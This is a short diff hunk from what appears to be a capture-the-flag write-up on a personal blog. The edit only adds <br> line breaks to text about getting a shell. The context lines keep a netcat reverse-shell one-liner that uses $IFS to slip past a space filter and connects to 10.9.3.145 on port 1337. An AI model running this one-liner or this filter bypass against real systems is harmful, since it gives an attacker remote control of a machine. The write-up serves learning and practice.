@@ -54,8 +54,9 @@ dope! it has been bypassed. which means we have to replace the spaces with $IFS
 rm$IFS/tmp/f;mkfifo$IFS/tmp/f;cat$IFS/tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f
 ```
 ![rev-shell](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/760a62df-4925-44ae-b577-07654cb8fa56)
-cool we have a shell xD
-so, stabilize the shell.
+
+<br> cool we have a shell xD
+<br> so, stabilize the shell.
 
 <h2>Privilege escalation</h2>
 
